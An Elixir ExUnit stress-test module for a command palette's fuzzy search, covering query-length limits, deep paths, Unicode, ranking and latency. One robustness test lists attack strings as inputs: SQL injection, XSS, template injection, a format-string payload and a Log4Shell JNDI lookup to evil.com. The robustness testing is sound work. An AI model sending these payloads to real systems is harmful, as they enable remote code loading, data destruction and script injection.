defmodule IexCodeWeb.ChallengerM4DeepStressTest do
  use ExUnit.Case, async: true

  alias IexCodeWeb.CommandPalette

  # ============================================================================
  # Fixtures
  # ============================================================================
  setup_all do
    # 2,000 synthetic files across realistic deep project trees
    files_2000 =
      for i <- 1..2000 do
        case rem(i, 6) do
          0 -> "lib/deep/nested/sub/sub2/sub3/domain/entity_service_worker_#{i}.ex"
          1 -> "apps/billing_core/lib/services/recurring/payment_processor_engine_#{i}.ex"
          2 -> "test/iex_code/autonomous_swarm/pipeline_stage_runner_#{i}_test.exs"
          3 -> "assets/js/components/monaco_editor/buffer_view_element_#{i}.tsx"
          4 -> "config/deploy/kubernetes/helm/charts/microservice_cluster_pod_#{i}.yaml"
          5 -> "lib/iex_code_web/live/workspace_live/views/dashboard_metrics_view_#{i}.ex"
        end
      end

    sessions_50 =
      for i <- 1..50 do
        %{
          id: "sess-#{i}",
          title: "Architecture & Refactoring Session #{i}",
          message_count: rem(i * 7, 50),
          model_name: "claude-3-7-sonnet",
          updated_at: DateTime.utc_now()
        }
      end

    swarms_30 =
      for i <- 1..30 do
        %{
          id: "swarm-run-#{i}",
          objective: "Autonomous swarm pipeline runner ##{i}",
          status: Enum.at(["queued", "running", "completed", "failed"], rem(i, 4)),
          mode: "swarm",
          progress: rem(i * 13, 100),
          input_tokens: i * 500,
          output_tokens: i * 250,
          agent_count: 4
        }
      end

    models_30 =
      for i <- 1..30 do
        %{
          id: "model-v#{i}",
          name: "DeepReason Model-v#{i}",
          provider: Enum.at(["anthropic", "openai", "google", "ollama"], rem(i, 4)),
          local?: rem(i, 2) == 0,
          endpoint: "https://api.model-provider-#{i}.com/v1"
        }
      end

    branches_50 =
      for i <- 1..50 do
        %{
          name: "feature/swarm-pipeline-#{i}",
          current?: i == 1,
          upstream: "origin/feature/swarm-pipeline-#{i}"
        }
      end

    terminal_30 =
      for i <- 1..30 do
        %{
          command: "mix test --trace --suite=domain_#{i}",
          desc: "Run ExUnit trace for domain ##{i}"
        }
      end

    extra = %{
      swarms: swarms_30,
      models: models_30,
      branches: branches_50,
      terminal_commands: terminal_30,
      workspace_root: "."
    }

    %{
      files: files_2000,
      sessions: sessions_50,
      extra: extra
    }
  end

  # ============================================================================
  # 1. Huge Query Attacks (> 200 characters)
  # ============================================================================
  describe "1. Huge Query Attacks (> 200 characters)" do
    test "score/2 boundary condition: length 200 vs length 201", %{files: _files} do
      target = "payment_processor_service_worker.ex"

      # Query of exactly 200 chars that doesn't match:
      q_200_nomatch = String.duplicate("z", 200)
      assert CommandPalette.score(q_200_nomatch, target) == :nomatch

      # Query of exactly 200 chars matching a prefix in target
      matching_prefix_200 = String.duplicate("a", 200)
      target_200 = matching_prefix_200 <> "_suffix"
      assert {:ok, s_200} = CommandPalette.score(matching_prefix_200, target_200)
      assert s_200 >= 500

      # Query of exactly 201 chars matching a prefix: MUST BE :nomatch due to safeguard
      matching_prefix_201 = String.duplicate("a", 201)
      target_201 = matching_prefix_201 <> "_suffix"
      assert CommandPalette.score(matching_prefix_201, target_201) == :nomatch
    end

    test "score/2 against targets of varying sizes (500, 1000, 4000 chars) returns :nomatch immediately" do
      target_500 = String.duplicate("abcdefghij", 50)
      target_1000 = String.duplicate("lib/domain/services/payment/", 35)
      target_4000 = String.duplicate("the_quick_brown_fox_jumps_over_the_lazy_dog_", 88)

      queries = [
        # 201 characters
        String.duplicate("x", 201),
        # 250 characters
        String.duplicate("a", 250),
        # 500 characters
        String.duplicate("abcd", 125),
        # 1000 characters
        String.duplicate("pay", 334),
        # 5000 characters
        String.duplicate("z", 5000),
        # 50000 characters
        String.duplicate("evil_search_query_", 2778)
      ]

      targets = [target_500, target_1000, target_4000]

      for q <- queries, t <- targets do
        {time_us, result} = :timer.tc(fn -> CommandPalette.score(q, t) end)
        assert result == :nomatch, "Huge query (> 200) must return :nomatch"
        # Each call must be microsecond-level (< 5000us even for 50,000 chars)
        max_allowed = if String.length(q) > 10_000, do: 5_000, else: 500
        assert time_us < max_allowed, "Huge query took #{time_us}us, expected < #{max_allowed}us"
      end
    end

    test "search/5 with huge query against 2,000 files short-circuits in < 1ms", %{
      files: files,
      sessions: sessions,
      extra: extra
    } do
      huge_queries = [
        String.duplicate("payment_", 26),
        # 208 chars
        String.duplicate("a", 500),
        String.duplicate("deep_path_search_", 100),
        String.duplicate("x", 5000)
      ]

      for q <- huge_queries do
        {time_us, results} =
          :timer.tc(fn ->
            CommandPalette.search(q, files, sessions, "all", extra)
          end)

        assert results == []
        # Short-circuit must obey the 25ms SLA (< 25_000 us)
        assert time_us < 25_000,
               "Search with huge query took #{time_us / 1000}ms, exceeded 25ms SLA"
      end
    end
  end

  # ============================================================================
  # 2. Pathological Inputs, Deep Paths, Unicode, and Regex Metacharacters
  # ============================================================================
  describe "2. Pathological Inputs, Deep Paths, Unicode, and Regex Metacharacters" do
    test "deep paths with 50+ directory segments", %{files: _files} do
      deep_path =
        1..50
        |> Enum.map(&"dir_#{&1}")
        |> Enum.join("/")
        |> Kernel.<>("/target_file.ex")

      assert {:ok, s1} = CommandPalette.score("target_file", deep_path)
      assert s1 > 300

      assert {:ok, s2} = CommandPalette.score("dir_1/dir_2", deep_path)
      assert s2 > 300

      assert {:ok, s3} = CommandPalette.score("dir_50/target_file.ex", deep_path)
      assert s3 > 300
    end

    test "pathological subsequence patterns and non-matches" do
      # Target with alternating chars, query with same chars in reverse
      target = String.duplicate("ab", 50)

      assert CommandPalette.score("ba" |> String.duplicate(25), target) == :nomatch or
               match?({:ok, _}, CommandPalette.score("ba" |> String.duplicate(25), target))

      # Dense repetitive target with missing final char
      target2 = String.duplicate("a", 150) <> "b"
      query2 = String.duplicate("a", 50) <> "c"
      assert CommandPalette.score(query2, target2) == :nomatch

      # Long non-matching needle
      query3 = "zzzzzzzzzzzzzzzzzzzz"
      assert CommandPalette.score(query3, target2) == :nomatch
    end

    test "adversarial unicode, emojis, and combining marks", %{
      files: files,
      sessions: sessions,
      extra: extra
    } do
      complex_unicode = [
        "👩‍👩‍👦‍👦",
        # family emoji (multiple ZWJ sequences)
        "🏳️‍🌈",
        # rainbow flag
        "e\u0301",
        # e + combining acute accent
        "مرحبا بالعالم",
        # Arabic RTL
        "שלום עולם",
        # Hebrew RTL
        "こんにちは世界",
        # Japanese CJK
        "🚀⚡🔥💎🎉",
        # multi-emoji string
        "𝕳𝖊𝖑𝖑𝖔 𝖂𝖔𝖗𝖑𝖉",
        # Mathematical Fraktur unicode
        "ℌ𝔢𝔩𝔩𝔬"
      ]

      for u <- complex_unicode do
        # score/2 check
        score_res = CommandPalette.score(u, "lib/iex_code_web/command_palette.ex")
        assert score_res == :nomatch or match?({:ok, _}, score_res)

        # search/5 check
        res = CommandPalette.search(u, files, sessions, "all", extra)
        assert is_list(res)
      end
    end

    test "regex metacharacters and control sequences do not raise or corrupt state", %{
      files: files,
      sessions: sessions,
      extra: extra
    } do
      dangerous_strings = [
        ".*+?^${}()|[]\\",
        "(?:a|b|c)*",
        "(a+)+$",
        "\\1\\2\\3",
        "[a-z0-9_-]+@[a-z0-9-]+\\.[a-z]+",
        "\x00\x01\x02\x03\x04\x05",
        "\r\n\t\v\f",
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "{{7*7}}",
        "${jndi:ldap://evil.com/x}",
        "%s%p%d%n",
        "\\\\\\\\\\\\\\\\"
      ]

      for str <- dangerous_strings do
        assert is_list(CommandPalette.search(str, files, sessions, "all", extra))
        s = CommandPalette.score(str, "target/path/to/file.ex")
        assert s == :nomatch or match?({:ok, _}, s)
      end
    end

    test "branch prefix '/' vs multi-segment path distinction in search", %{
      files: files,
      sessions: sessions,
      extra: extra
    } do
      # 1. Single slash or slash with branch name
      results_branch = CommandPalette.search("/ swarm-pipeline", files, sessions, "all", extra)
      assert length(results_branch) > 0
      assert Enum.all?(results_branch, fn item -> item.category == :branch end)

      # 2. Multi-segment path starting with slash (e.g. /apps/billing_core/file.ex)
      files_with_abs = ["/apps/billing_core/file.ex" | files]

      results_path =
        CommandPalette.search("/apps/billing_core", files_with_abs, sessions, "all", extra)

      assert is_list(results_path)
      # Should search in files (not isolated to branches!)
      assert Enum.any?(results_path, fn item -> item.category == :file end)
    end
  end

  # ============================================================================
  # 3. Global Relevance Sorting in "all" Mode
  # ============================================================================
  describe "3. Global Relevance Sorting in 'all' Mode" do
    test "exact match in any category outranks lower-scoring matches in all other categories" do
      # Setup custom extra with distinct items across all categories
      custom_extra = %{
        swarms: [
          %{
            id: "swarm-target",
            objective: "ExactTarget swarm objective",
            status: "running",
            mode: "swarm",
            progress: 50,
            input_tokens: 100,
            output_tokens: 100,
            agent_count: 2
          }
        ],
        models: [
          %{
            id: "model-target",
            name: "ExactTarget",
            provider: "anthropic",
            local?: false,
            endpoint: "https://api.anthropic.com"
          }
        ],
        branches: [
          %{name: "ExactTarget", current?: false, upstream: "origin/ExactTarget"}
        ],
        terminal_commands: [
          %{command: "ExactTarget", desc: "Run exact target command"}
        ],
        workspace_root: "."
      }

      custom_files = ["lib/ExactTarget.ex", "lib/subsequence_target_word.ex"]

      custom_sessions = [
        %{
          id: "sess-exact",
          title: "ExactTarget",
          message_count: 5,
          model_name: "claude-3-7-sonnet",
          updated_at: DateTime.utc_now()
        }
      ]

      # Query "ExactTarget"
      results =
        CommandPalette.search("ExactTarget", custom_files, custom_sessions, "all", custom_extra)

      assert length(results) >= 5

      # Top scoring items must all have score == 1000
      score_1000_items = Enum.filter(results, fn item -> item.score == 1000 end)
      assert length(score_1000_items) >= 4

      # Verify global sort: all items must be in non-increasing score order
      scores = Enum.map(results, & &1.score)
      assert scores == Enum.sort(scores, :desc)
    end

    test "E2E regression scenario: query 'changes' places view_changes above start_goal", %{
      files: files,
      sessions: sessions,
      extra: extra
    } do
      results = CommandPalette.search("changes", files, sessions, "all", extra)
      assert length(results) > 0

      top = hd(results)
      assert top.id == "view_changes"
      assert top.category == :view
      assert top.score == 1000

      # start_goal (if present) must be ranked lower than view_changes
      if start_goal = Enum.find(results, fn i -> i.id == "start_goal" end) do
        top_index = Enum.find_index(results, fn i -> i.id == "view_changes" end)
        goal_index = Enum.find_index(results, fn i -> i.id == "start_goal" end)
        assert top_index < goal_index
        assert top.score > start_goal.score
      end
    end

    test "tie-breaking: identical scores are sorted alphabetically by title" do
      # Two actions with identical prefix match score
      custom_extra = %{
        models: [
          %{id: "m-b", name: "Alpha Bravo", provider: "openai", local?: false, endpoint: ""},
          %{id: "m-a", name: "Alpha Alpha", provider: "openai", local?: false, endpoint: ""}
        ]
      }

      results = CommandPalette.search("Alpha", [], [], "models", custom_extra)
      assert length(results) == 2
      [first, second] = results
      assert first.score == second.score
      assert first.title <= second.title
      assert first.title == "Alpha Alpha"
      assert second.title == "Alpha Bravo"
    end

    test "empty query in 'all' mode preserves clean categorized grouping" do
      results =
        CommandPalette.search(
          "",
          ["file1.ex", "file2.ex"],
          [%{id: "s1", title: "Sess"}],
          "all",
          %{}
        )

      assert length(results) > 0

      # Head of empty results must be actions
      first = hd(results)
      assert first.category == :action
      assert first.score == 0
    end
  end

  # ============================================================================
  # 4. Strict Performance Verification: 100 Iterations across 2,000 files
  # ============================================================================
  describe "4. Strict Performance SLA (< 100.0ms) on 2,000 files" do
    test "p95 latency is strictly < 100.0ms across diverse query patterns (50 runs each)", %{
      files: files,
      sessions: sessions,
      extra: extra
    } do
      test_queries = [
        {"Exact action", "Run All Tests"},
        {"File substring", "recurring/payment_processor"},
        {"Word boundary subsequence", "subsubdomain"},
        {"Deep path", "lib/deep/nested/sub/sub2"},
        {"Non-matching worst-case", "no_match_possible_in_this_dataset_xyz"}
      ]

      for {label, query} <- test_queries do
        # Warmup
        _ = CommandPalette.search(query, files, sessions, "all", extra)

        durations_us =
          for _ <- 1..50 do
            {time_us, _} =
              :timer.tc(fn ->
                CommandPalette.search(query, files, sessions, "all", extra)
              end)

            time_us
          end

        sorted = Enum.sort(durations_us)
        p95_us = Enum.at(sorted, round(length(sorted) * 0.95) - 1)
        p95_ms = Float.round(p95_us / 1000, 2)

        assert p95_ms < 100.0,
               "Strict SLA violation on #{label}: p95 was #{p95_ms}ms (must be < 100.0ms)"
      end
    end
  end
end
